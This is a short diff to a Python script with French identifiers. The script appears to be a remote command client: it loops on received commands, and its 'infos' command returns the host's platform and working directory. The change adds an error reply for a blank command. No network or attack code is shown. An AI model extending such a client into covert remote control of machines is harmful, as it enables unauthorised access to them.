@@ -43,7 +43,10 @@ while True:
     commande_split = commande.split(" ")
     
     # ------------------------------------------------------------------------------
-    if commande == "infos":
+    if commande == " ":
+        reponse = "Erreur dans la commande...".encode('ascii', errors='ignore')
+    # ------------------------------------------------------------------------------
+    elif commande == "infos":
         reponse = platform.platform() + " " + os.getcwd()
         reponse = reponse.encode('ascii', errors='ignore')
     # ------------------------------------------------------------------------------
